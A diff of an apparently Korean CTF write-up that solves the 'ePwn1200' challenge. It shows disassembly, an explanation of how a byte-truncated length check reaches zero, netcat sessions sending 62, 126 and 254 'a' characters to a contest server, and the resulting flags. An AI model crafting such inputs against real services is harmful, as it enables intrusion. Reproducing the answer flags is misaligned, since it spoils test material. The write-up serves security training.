@@ -123,9 +123,118 @@ Input your name : Your name is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ISCTF{Overfffffffflow!!}
 ````
 
-flag를 얻을 수 있다.
+Answer flag:
+
+````
+ISCTF{Overfffffffflow!!}
+````
 
 ## ePwn1200
+
+````
+C:\Users\akwke\Desktop\netcat-1.11>nc.exe
+Cmd line: 45.32.46.195 10001
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+]
+size : 63
+Is this possible!? WOW!?
+ISCTF{I know that 2147483648 is less than 0!}
+````
+
+### 풀이
+
+ePwn1200의 주요 바이너리는 다음과 같다.
+
+````
+.text:0804854B buf             = dword ptr -109h
+.text:0804854B var_9           = byte ptr –9
+...
+.text:080485B0                 call    _read
+.text:080485B5                 add     esp, 0Ch
+.text:080485B8                 lea     eax, [ebp+buf]
+.text:080485BE                 push    eax
+.text:080485BF                 push    offset format   ; "buf : [%s]\n"
+.text:080485C4                 call    _printf
+.text:080485C9                 add     esp, 8
+.text:080485CC                 lea     eax, [ebp+buf]
+.text:080485D2                 push    eax             ; s
+.text:080485D3                 call    _strlen
+.text:080485D8                 add     esp, 4
+.text:080485DB                 push    eax
+.text:080485DC                 push    offset aSizeD   ; "size : %d\n"
+.text:080485E1                 call    _printf
+.text:080485E6                 add     esp, 8
+.text:080485E9                 lea     eax, [ebp+buf]
+.text:080485EF                 push    eax             ; s
+.text:080485F0                 call    _strlen
+.text:080485F5                 add     esp, 4
+.text:080485F8                 add     eax, 1
+.text:080485FB                 shl     eax, 2
+.text:080485FE                 mov     [ebp+var_9], al
+.text:08048601                 cmp     [ebp+var_9], 0
+.text:08048605                 jz      short loc_8048616
+.text:08048607                 push    offset s        ; "I think there is no bug here..."
+.text:0804860C                 call    _puts
+.text:08048611                 add     esp, 4
+.text:08048614                 jmp     short loc_8048630
+.text:08048616 ; ---------------------------------------------------------------------------
+.text:08048616
+.text:08048616 loc_8048616:                            ; CODE XREF: main+BAj
+.text:08048616                 push    offset aIsThisPossible ; "Is this possible!? WOW!?"
+.text:0804861B                 call    _puts
+.text:08048620                 add     esp, 4
+.text:08048623                 push    offset command  ; "/bin/cat /home/epwn1200/flag"
+.text:08048628                 call    _system
+.text:0804862D                 add     esp, 4
+````
+
+주목해야하는 점은, AL이 0만 되면, Flag가 출력된다는 것이다.
+
+1. EAX에 입력 문자열의 길이 + 1 ( Enter ) 이 저장된다. 그리고 size : %d의 인자는 eax이므로 eax의 값이 출력된다.
+2. AL = Low 8bit이므로 이를 0으로 만들기 위해선 ( 입력 문자열 길이 + Enter + 1 ) * 4가 256의 배수면 된다.
+3. Buf의 크기는 100h ( 256 )이므로 62, 126, 254개의 문자로 이루어진 문자열이 저장가능하다.
+
+그래서 다음과 같이 a를 62개, 126개, 254개 집어 넣으면 Flag값이 출력된다.
+
+````
+C:\Users\akwke\Desktop\netcat-1.11>nc.exe
+Cmd line: 45.32.46.195 10001
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+]
+size : 63
+Is this possible!? WOW!?
+ISCTF{I know that 2147483648 is less than 0!}
+````
+
+````
+C:\Users\akwke\Desktop\netcat-1.11>nc.exe
+Cmd line: 45.32.46.195 10001
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+]
+size : 127
+Is this possible!? WOW!?
+ISCTF{I know that 2147483648 is less than 0!}
+````
+
+````
+C:\Users\akwke\Desktop\netcat-1.11>nc.exe
+Cmd line: 45.32.46.195 10001
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+]
+size : 255
+Is this possible!? WOW!?
+ISCTF{I know that 2147483648 is less than 0!}
+````
+
+Answer flag:
+
+````
+ISCTF{I know that 2147483648 is less than 0!}
+````
 
 ## ePwn1500
 
